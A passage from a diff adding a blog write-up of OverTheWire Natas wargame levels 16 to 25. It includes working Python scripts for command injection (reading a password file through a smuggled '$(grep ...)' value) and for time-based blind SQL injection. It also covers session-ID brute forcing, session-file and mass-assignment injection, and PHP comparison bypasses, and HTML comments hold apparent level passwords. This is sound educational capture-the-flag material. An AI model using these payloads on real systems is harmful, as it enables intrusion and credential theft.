style="color:#5af78e">&#39;h&#39;</span>, <span style="color:#5af78e">&#39;i&#39;</span>, <span style="color:#5af78e">&#39;j&#39;</span>, <span style="color:#5af78e">&#39;k&#39;</span>, <span style="color:#5af78e">&#39;l&#39;</span>, <span style="color:#5af78e">&#39;m&#39;</span>, <span style="color:#5af78e">&#39;n&#39;</span>, <span style="color:#5af78e">&#39;o&#39;</span>, <span style="color:#5af78e">&#39;p&#39;</span>, <span style="color:#5af78e">&#39;q&#39;</span>, <span style="color:#5af78e">&#39;r&#39;</span>, <span style="color:#5af78e">&#39;s&#39;</span>, <span style="color:#5af78e">&#39;t&#39;</span>, <span style="color:#5af78e">&#39;u&#39;</span>, <span style="color:#5af78e">&#39;v&#39;</span>, <span style="color:#5af78e">&#39;w&#39;</span>, <span style="color:#5af78e">&#39;x&#39;</span>, <span style="color:#5af78e">&#39;y&#39;</span>, <span style="color:#5af78e">&#39;z&#39;</span>, <span style="color:#5af78e">&#39;0&#39;</span>, <span style="color:#5af78e">&#39;1&#39;</span>, <span style="color:#5af78e">&#39;2&#39;</span>, <span style="color:#5af78e">&#39;3&#39;</span>, <span style="color:#5af78e">&#39;4&#39;</span>, <span style="color:#5af78e">&#39;5&#39;</span>, <span style="color:#5af78e">&#39;6&#39;</span>, <span style="color:#5af78e">&#39;7&#39;</span>, <span style="color:#5af78e">&#39;8&#39;</span>, <span style="color:#5af78e">&#39;9&#39;</span>]
+</span></span><span style="display:flex;"><span>base <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">while</span> <span style="color:#ff6ac1">True</span>:
+</span></span><span style="display:flex;"><span>    original_base_length <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">len</span>(base)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> c <span style="color:#ff6ac1">in</span> chars:
+</span></span><span style="display:flex;"><span>        guess <span style="color:#ff6ac1">=</span> base <span style="color:#ff6ac1">+</span> c
+</span></span><span style="display:flex;"><span>        payload[<span style="color:#5af78e">&#39;needle&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;$(grep ^&#34;</span> <span style="color:#ff6ac1">+</span> guess <span style="color:#ff6ac1">+</span>  <span style="color:#5af78e">&#34; /etc/natas_webpass/natas17)nuts&#34;</span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>get(url, auth<span style="color:#ff6ac1">=</span>basic, params<span style="color:#ff6ac1">=</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> response<span style="color:#ff6ac1">.</span>text<span style="color:#ff6ac1">.</span>find(<span style="color:#5af78e">&#39;nuts&#39;</span>) <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>: <span style="color:#78787e"># nuts in response text; wrong guess</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>            base <span style="color:#ff6ac1">=</span> guess
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(base)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> original_base_length <span style="color:#ff6ac1">==</span> <span style="color:#ff5c57">len</span>(base):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;password for natas17 is: &#34;</span> <span style="color:#ff6ac1">+</span> base)
+</span></span></code></pre></div><p>The script runs quite slowly, but it works!</p>
+<p><a href="/images/otw_natas/natas16-3_result.png"><img src="/images/otw_natas/natas16-3_result.png" alt="result of running exploit script"></a></p>
+<!-- XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd -->
+<h3 id="a-namelevel-17a-level-17"><a name="level-17"></a> Level 17</h3>
+<p>This level is similar to level 15, where we have to brute force the password storedin the database. The difference now is that the server won&rsquo;t provide any output for whatever query we give.</p>
+<p>Hence, we have to find some way to deduce whether our guesses are right ot wrong. We can do so using a <a href="https://www.sqlinjection.net/time-based/">time-based blind SQL injection</a>: if the guess is correct, wait 5 seconds before responding, else respond as soon as you can. This can be achieved using SQL&rsquo;s <code>SLEEP</code> and <code>IF</code> functions, in addition to the <code>time</code> python library to time the response duration.</p>
+<p>As such, the final exploit script which is adapted from challenge 15 is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> requests.auth <span style="color:#ff6ac1">import</span> HTTPBasicAuth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://natas17.natas.labs.overthewire.org/index.php&#34;</span>
+</span></span><span style="display:flex;"><span>basic <span style="color:#ff6ac1">=</span> HTTPBasicAuth(<span style="color:#5af78e">&#34;natas17&#34;</span>, <span style="color:#5af78e">&#34;&lt;natas 17 password&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff6ac1">=</span> {<span style="color:#5af78e">&#34;username&#34;</span>:<span style="color:#5af78e">&#34;&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars <span style="color:#ff6ac1">=</span> [<span style="color:#5af78e">&#39;A&#39;</span>, <span style="color:#5af78e">&#39;B&#39;</span>, <span style="color:#5af78e">&#39;C&#39;</span>, <span style="color:#5af78e">&#39;D&#39;</span>, <span style="color:#5af78e">&#39;E&#39;</span>, <span style="color:#5af78e">&#39;F&#39;</span>, <span style="color:#5af78e">&#39;G&#39;</span>, <span style="color:#5af78e">&#39;H&#39;</span>, <span style="color:#5af78e">&#39;I&#39;</span>, <span style="color:#5af78e">&#39;J&#39;</span>, <span style="color:#5af78e">&#39;K&#39;</span>, <span style="color:#5af78e">&#39;L&#39;</span>, <span style="color:#5af78e">&#39;M&#39;</span>, <span style="color:#5af78e">&#39;N&#39;</span>, <span style="color:#5af78e">&#39;O&#39;</span>, <span style="color:#5af78e">&#39;P&#39;</span>, <span style="color:#5af78e">&#39;Q&#39;</span>, <span style="color:#5af78e">&#39;R&#39;</span>, <span style="color:#5af78e">&#39;S&#39;</span>, <span style="color:#5af78e">&#39;T&#39;</span>, <span style="color:#5af78e">&#39;U&#39;</span>, <span style="color:#5af78e">&#39;V&#39;</span>, <span style="color:#5af78e">&#39;W&#39;</span>, <span style="color:#5af78e">&#39;X&#39;</span>, <span style="color:#5af78e">&#39;Y&#39;</span>, <span style="color:#5af78e">&#39;Z&#39;</span>, <span style="color:#5af78e">&#39;a&#39;</span>, <span style="color:#5af78e">&#39;b&#39;</span>, <span style="color:#5af78e">&#39;c&#39;</span>, <span style="color:#5af78e">&#39;d&#39;</span>, <span style="color:#5af78e">&#39;e&#39;</span>, <span style="color:#5af78e">&#39;f&#39;</span>, <span style="color:#5af78e">&#39;g&#39;</span>, <span style="color:#5af78e">&#39;h&#39;</span>, <span style="color:#5af78e">&#39;i&#39;</span>, <span style="color:#5af78e">&#39;j&#39;</span>, <span style="color:#5af78e">&#39;k&#39;</span>, <span style="color:#5af78e">&#39;l&#39;</span>, <span style="color:#5af78e">&#39;m&#39;</span>, <span style="color:#5af78e">&#39;n&#39;</span>, <span style="color:#5af78e">&#39;o&#39;</span>, <span style="color:#5af78e">&#39;p&#39;</span>, <span style="color:#5af78e">&#39;q&#39;</span>, <span style="color:#5af78e">&#39;r&#39;</span>, <span style="color:#5af78e">&#39;s&#39;</span>, <span style="color:#5af78e">&#39;t&#39;</span>, <span style="color:#5af78e">&#39;u&#39;</span>, <span style="color:#5af78e">&#39;v&#39;</span>, <span style="color:#5af78e">&#39;w&#39;</span>, <span style="color:#5af78e">&#39;x&#39;</span>, <span style="color:#5af78e">&#39;y&#39;</span>, <span style="color:#5af78e">&#39;z&#39;</span>, <span style="color:#5af78e">&#39;0&#39;</span>, <span style="color:#5af78e">&#39;1&#39;</span>, <span style="color:#5af78e">&#39;2&#39;</span>, <span style="color:#5af78e">&#39;3&#39;</span>, <span style="color:#5af78e">&#39;4&#39;</span>, <span style="color:#5af78e">&#39;5&#39;</span>, <span style="color:#5af78e">&#39;6&#39;</span>, <span style="color:#5af78e">&#39;7&#39;</span>, <span style="color:#5af78e">&#39;8&#39;</span>, <span style="color:#5af78e">&#39;9&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">64</span>):
+</span></span><span style="display:flex;"><span>    original_length <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">len</span>(base)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> c <span style="color:#ff6ac1">in</span> chars:
+</span></span><span style="display:flex;"><span>        payload[<span style="color:#5af78e">&#34;username&#34;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;natas18</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e"> and IF(password like BINARY </span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&#34;</span> <span style="color:#ff6ac1">+</span> base <span style="color:#ff6ac1">+</span> c <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;%</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">, sleep(5), 1) #&#34;</span>
+</span></span><span style="display:flex;"><span>        start <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>post(url, auth<span style="color:#ff6ac1">=</span>basic, params<span style="color:#ff6ac1">=</span>payload)
+</span></span><span style="display:flex;"><span>        end <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> end <span style="color:#ff6ac1">-</span> start <span style="color:#ff6ac1">&gt;=</span> <span style="color:#ff9f43">5</span>:
+</span></span><span style="display:flex;"><span>            base <span style="color:#ff6ac1">+=</span> c
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(base)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> original_length <span style="color:#ff6ac1">==</span> <span style="color:#ff5c57">len</span>(base):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;password is: &#34;</span> <span style="color:#ff6ac1">+</span> base)
+</span></span></code></pre></div><p>This program runs quite slowly, but it works!</p>
+<p><a href="/images/otw_natas/natas17-1_result.png"><img src="/images/otw_natas/natas17-1_result.png" alt="output of running exploit script"></a></p>
+<h3 id="a-namelevel-18a-level-18"><a name="level-18"></a> Level 18</h3>
+<p>We see from the source that when a user accesses the site, the site first checks if the <code>PHPSESSID</code> cookie is set. If it is, then the server loads the corresponding existing session. If it isn&rsquo;t, then the server takes the input username and password and assigns a random integer from 1 to 640 as the session id. It then checks if the username and password entered are an admin&rsquo;s, and sets the <code>admin</code> session variable accordingly. If this variable is set to 1, the password for natas19 is printed out, else the server prompts the user to log in as an admin.</p>
+<p>The problem is that the function meant to perform the admin credential check doesn&rsquo;t work as intended, and just sets the <code>admin</code> session variable to 0 every time.</p>
+<p>I initially thought the challenge was to perform an injection to set the <code>admin</code> session variable to 1, but this didn&rsquo;t yield much.</p>
+<p>After looking at some hints, I realised that the expected approach was to brute force the <code>PHPSESSID</code> cookie with all 640 possible ids in a bid to &lsquo;steal&rsquo; an existing admin session.</p>
+<p>We can use Burpsuite&rsquo;s intruder function to achieve this. We have to first use burpsuite&rsquo;s proxy feature to intercept an outgoing request from the site and send that request to the intruder. We then mark the <code>PHPSESSID</code> cookie value as the payload to iterate over:</p>
+<p><a href="/images/otw_natas/natas18-1_intruder-setup.png"><img src="/images/otw_natas/natas18-1_intruder-setup.png" alt="setting up intruder"></a></p>
+<p>In the payloads tab of intruder, we change the payload type to &rsquo;numbers&rsquo;, and enter the correct range in the &lsquo;payload settings&rsquo; section. We then click on &lsquo;start attack&rsquo; near the top right corner, and let intruder do its magic.</p>
+<p>Intruder logs the response for each request. Most requests will have similar response lengths (+/- 1 or 2 chars), since the response when a session id doesn&rsquo;t belong to an admin is the same. However, if we sort the response lengths in decreasing order, we will eventually notice a response which is significantly longer, and this is the one which contains the password for the next level.</p>
+<p><a href="/images/otw_natas/natas18-2_result.png"><img src="/images/otw_natas/natas18-2_result.png" alt="result of running intruder"></a></p>
+<!-- 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s -->
+<h3 id="a-namelevel-19a-level-19"><a name="level-19"></a> Level 19</h3>
+<p>If we intercept the outgoing request, we see that there is a <code>PHPSESSID</code> cookie just like before, exept that the values now resemble a hexadecimal encoded string:</p>
+<p><a href="/images/otw_natas/natas19-1_hex-string.png"><img src="/images/otw_natas/natas19-1_hex-string.png" alt="hexadecimal string in cookie value"></a></p>
+<p>If we decode the hex string, we see that the plaintext string is a number followed by &lsquo;-admin&rsquo;, in this case &lsquo;95-admin&rsquo;. If we send that request to the repeater and try the different similar strings such as &lsquo;1-admin&rsquo; and &lsquo;640-admin&rsquo; (hex encoded of course), the page says that we are logged in as a regular user, which indicates that these are likely valid session ids.</p>
+<p>If we try random strings such as &lsquo;abcde&rsquo; as the value of the cookie, the server tells us that there is an error, or doesn&rsquo;t tell us that we&rsquo;re logged in. From this, we can deduce that the format of the <code>PHPSESSID</code> cookie is probably &rsquo;n-admin&rsquo; in hex encoding, where n is some integer (presumably 1 to 640).</p>
+<p>We can brute force the session ids with intruder like before. We can generate all hex encoded strings from &lsquo;1-admin&rsquo; to &lsquo;640-admin&rsquo; using the following script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>suffix <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;-admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">641</span>):
+</span></span><span style="display:flex;"><span>    cookie <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">str</span>(i) <span style="color:#ff6ac1">+</span> suffix
+</span></span><span style="display:flex;"><span>    cookie_encoded <span style="color:#ff6ac1">=</span> cookie<span style="color:#ff6ac1">.</span>encode(<span style="color:#5af78e">&#39;utf-8&#39;</span>)<span style="color:#ff6ac1">.</span>hex()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(cookie_encoded)
+</span></span></code></pre></div><p>We can use <code>python generate_strings.py &gt; payload.txt</code> when running this script in the terminal to write the output of the script to a text file which we can simply load into burpsuite (make sure the payload type is &lsquo;simple list&rsquo;).</p>
+<p><a href="/images/otw_natas/natas19-2_intruder-payload-setup.png"><img src="/images/otw_natas/natas19-2_intruder-payload-setup.png" alt="setting up intruder"></a></p>
+<p>We can then click on &lsquo;start attack&rsquo;, sort response length in decreasing order, and wait. Once the correct id is found, the password for natas20 is too:</p>
+<p><a href="/images/otw_natas/natas19-3_result.png"><img src="/images/otw_natas/natas19-3_result.png" alt="result of intruder attack"></a></p>
+<!-- guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH -->
+<h3 id="a-namelevel-20a-level-20"><a name="level-20"></a> Level 20</h3>
+<p>Looking at the source, we just focus on <code>print_credentials</code>, <code>myread</code>, <code>mywrite</code>, and the main application logic down below.</p>
+<p><code>myread</code> and <code>mywrite</code> are functions for saving and reading session related information. <a href="https://www.php.net/manual/en/function.session-set-save-handler.php"><code>session_set_save_handler</code></a> in the main application logic indicates that these functions are used.</p>
+<p><code>myread</code> looks at the session ID in the request and reads from an existing file on the server (if it exists) to load session information, while <code>mywrite</code> writes session information into the file on the server for <code>myread</code> to retrieve in the future.</p>
+<p>One piece of session information is the &rsquo;name&rsquo; field. The application allows users to set or change their name, and this name is saved to the server and loaded when the session is resumed in the future.</p>
+<p>If we look at <code>print_credentials</code>, we find that the password for the next level will only be printed out if the session also has an &lsquo;admin&rsquo; variable set to 1. If we scan through the rest of the logic, there is no normal functionality which would allow us to set this directly. Furthermore, session IDs are non consecutive and seemingly random, and hence a session-hijacking approach like the past few levels seems unlikely.</p>
+<p>This hints that we likely need to exploit <code>myread</code> and <code>mywrite</code> to achieve this. If we look at <code>mywrite</code>, it seems as if all session related key-value pairs are simply concatenated with spaces and newlines as delimiters, i.e. the contents of the file will be of the format &lsquo;key1 value1&lt;newline&gt;key2 value2&lt;newline&gt;key3 value 3&hellip;&rsquo;.</p>
+<p><code>myread</code> reads this string and splits it into its key-value pairs using the <code>explode</code> function. It then splits it into key and value by splitting it along the space character, and loads these as session information.</p>
+<p>We need to somehow manipulate <code>myread</code> to read an &lsquo;admin&rsquo; session variable with value 1. We know that for this session variable to to be read, the stored session file needs to contain something like &rsquo;name bob&lt;newline&gt;admin 1&rsquo;.</p>
+<p>Thankfully, since the <code>mywrite</code> function and the name field has no input sanitation, and the format of the session file is known, we can enter &lsquo;bob&lt;newline&gt;admin 1&rsquo; as the name and click on the &lsquo;change name&rsquo; button. This writes &rsquo;name bob&lt;newline&gt;admin 1&rsquo; to the session file on the server, which is exactly what we want!</p>
+<p>To do this, we can use burpsuite to intercept an outgoing request, and literally enter the information in different lines, like so:</p>
+<p><a href="/images/otw_natas/natas20-1_input.png"><img src="/images/otw_natas/natas20-1_input.png" alt="input in burpsuite"></a></p>
+<p>After forwarding this request to the server, the server will write this to the server file. Reloading the page should cause the session information to be loaded from the session file which was just written on the server, showing us the password for natas21.</p>
+<!-- 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 -->
+<h3 id="a-namelevel-21a-level-21"><a name="level-21"></a> Level 21</h3>
+<p>This challenge involves 2 sites: the main site and an &rsquo;experimenter&rsquo; site. The main site does nothing except checking if an &lsquo;admin&rsquo; session variable is set to 1, and prints the password for natas22 if so. The experimenter site allows us to experiment with CSS to change the alignment, size, and colour of some sample text.</p>
+<p>Since the main site has limited functionality, the vulnerability we need to exploit should be on the experimenter site. We can also guess that these two sites share session information. Hence, the objective is to add an &lsquo;admin&rsquo; session variable and set it to 1 on the experimenter site, then use that session ID to access the main site and get the password.</p>
+<p>The experimenter site stores the alignment, fontsize, and background colour set by the user as session variables.</p>
+<p>The vulnerability we can exploit to add and set a new &lsquo;admin&rsquo; session variable is near the start of the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">// if update was submitted, store it
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#ff6ac1">if</span>(array_key_exists(<span style="color:#5af78e">&#34;submit&#34;</span>, <span style="color:#ff5c57">$_REQUEST</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">foreach</span>(<span style="color:#ff5c57">$_REQUEST</span> <span style="color:#ff6ac1">as</span> <span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">=&gt;</span> <span style="color:#ff5c57">$val</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$_SESSION</span>[<span style="color:#ff5c57">$key</span>] <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$val</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span></code></pre></div><p>The code snippet above takes each key-value pair in a request and stores them as session variables without sanitising the input. We can intercept the request and add the &lsquo;admin=1&rsquo; pair to the request, which will be sent to the server and stored as session variables:</p>
+<p><a href="/images/otw_natas/natas21-1_adding-admin-variable.png"><img src="/images/otw_natas/natas21-1_adding-admin-variable.png" alt="editing the request"></a></p>
+<p>After forwarding the request, this is what we should see in the experimenter site (&lsquo;debug&rsquo; param needs to be set):</p>
+<p><a href="/images/otw_natas/natas21-2_admin-set.png"><img src="/images/otw_natas/natas21-2_admin-set.png" alt="admin session variable set"></a></p>
+<p>We can then copy the session ID from the experimenter site and use it as the session ID in the main site (right -click on page &gt; inspect &gt; application &gt; cookies to access and edit the session ID cookie for the page). Reloading the page yields the password for natas22.</p>
+<!-- 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s -->
+<h3 id="a-namelevel-22a-level-22"><a name="level-22"></a> Level 22</h3>
+<p>There is nothing on the main page of the site. If we look at the source code, we see that it contains two blocks of PHP code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>session_start();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(array_key_exists(<span style="color:#5af78e">&#34;revelio&#34;</span>, <span style="color:#ff5c57">$_GET</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e">// only admins can reveal the password
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>    <span style="color:#ff6ac1">if</span>(<span style="color:#ff6ac1">!</span>(<span style="color:#ff5c57">$_SESSION</span> <span style="color:#ff6ac1">and</span> array_key_exists(<span style="color:#5af78e">&#34;admin&#34;</span>, <span style="color:#ff5c57">$_SESSION</span>) <span style="color:#ff6ac1">and</span> <span style="color:#ff5c57">$_SESSION</span>[<span style="color:#5af78e">&#34;admin&#34;</span>] <span style="color:#ff6ac1">==</span> <span style="color:#ff9f43">1</span>)) {
+</span></span><span style="display:flex;"><span>    header(<span style="color:#5af78e">&#34;Location: /&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">...
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(array_key_exists(<span style="color:#5af78e">&#34;revelio&#34;</span>, <span style="color:#ff5c57">$_GET</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">print</span> <span style="color:#5af78e">&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">print</span> <span style="color:#5af78e">&#34;&lt;pre&gt;Username: natas23</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">print</span> <span style="color:#5af78e">&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">...
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">HTML information
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">...
+</span></span></span></code></pre></div><p>If we send &lsquo;revelio&rsquo; as a HTTP parameter, i.e. <code>http://natas22.natas.labs.overthewire.org?revelio</code>, we just get redirected to the same page again. This is due to the <a href="https://www.php.net/manual/en/function.header.php">PHP <code>header</code> function</a> in the code, which causes the site to just send the same request again (without &lsquo;revelio&rsquo;), essentially reloading the site. This prevents the execution of the lower block of PHP code which logs us in as admin.</p>
+<p>Therefore, we need to prevent the redirect so the bottom code will get a chance to execute and the password to be served, and we can do this by using burpsuite&rsquo;s repeater to make the request:</p>
+<p><a href="/images/otw_natas/natas22-1_success-with-repeater.png"><img src="/images/otw_natas/natas22-1_success-with-repeater.png" alt="success using repeater"></a></p>
+<!-- qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj -->
+<h3 id="a-namelevel-23a-level-23"><a name="level-23"></a> Level 23</h3>
+<p>This challenge showcases PHP&rsquo;s strange type juggling/comparison behaviour.</p>
+<p>Looking at the source, we see that two conditions need to be met for natas24&rsquo;s password to be printed:</p>
+<ol>
+<li>
+<p><code>strstr($_REQUEST[&quot;passwd&quot;],&quot;iloveyou&quot;)</code> <br>
+This function returns a substring of the entered password (passwd) beginning from and including the first occurence of &lsquo;iloveyou&rsquo; <a href="https://www.php.net/manual/en/function.strstr.php">(source)</a>. Since non-empty strings in PHP are evaluated as true when interpreted as a boolean <a href="https://stackoverflow.com/questions/4775294/parsing-a-string-into-a-boolean-value-in-php">(source)</a>, for this condition to be true all we need is for the string &lsquo;iloveyou&rsquo; to show up in the password.</p>
+</li>
+<li>
+<p><code>$_REQUEST[&quot;passwd&quot;] &gt; 10</code> <br>
+This seems to indicate that the input password needs to be a number, but PHP automatically converts strings to numbers before performing the comparison if one operand is a number. <br>
+This means that the entered password will be converted to a number and compared with 10. To perform the conversion, PHP reads the characters in the string from left to right and stops when a non-numeral is reached. The following illustrates this behaviour:</p>
+</li>
+</ol>
+<p><a href="/images/otw_natas/natas23-1_conversion.png"><img src="/images/otw_natas/natas23-1_conversion.png" alt="conversion of string to int in PHP"></a></p>
+<p>Therefore, to fulfil these two conditions, we just need to concatenate an integer greater than 10 with &lsquo;iloveyou&rsquo; e.g. &lsquo;11iloveyou&rsquo; and send that as the password.</p>
+<!-- 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r -->
+<h3 id="a-namelevel-24a-level-24"><a name="level-24"></a> Level 24</h3>
+<p>We need <code>strcmp</code> to return false or 0 for the check to be passed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff6ac1">!</span>strcmp(<span style="color:#ff5c57">$_REQUEST</span>[<span style="color:#5af78e">&#34;passwd&#34;</span>],<span style="color:#5af78e">&#34;&lt;censored&gt;&#34;</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span></code></pre></div><p>While reseaching <code>strcmp</code> vulnerabilities, I came across <a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">this post</a>, which said that passing an empty array as one of the arguments to <code>strcmp</code> will make it return <code>null</code>. In PHP, the negation of <code>null</code> is 1, which means the check will be passed and the password of the next level will be printed.</p>
+<p>We can pass in an empty array by modifying the request in burpsuite:</p>
+<p><a href="/images/otw_natas/natas24-1_empty-array.png"><img src="/images/otw_natas/natas24-1_empty-array.png" alt="modifying the request to send empty array"></a></p>
+<p>The square brackets &lsquo;[]&rsquo; added behind the &lsquo;password&rsquo; parameter forces the parameter to be considered as an array.</p>
+<!-- O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx -->
+<h3 id="a-namelevel-25a-level-25"><a name="level-25"></a> Level 25</h3>
+<p>The website takes a parameter, <code>lang</code>. The default values of <code>lang</code> given by the server are &lsquo;de&rsquo; and &rsquo;en&rsquo; for german and english respectively. Selecting each of these languages displays a piece of text in the selected language.</p>
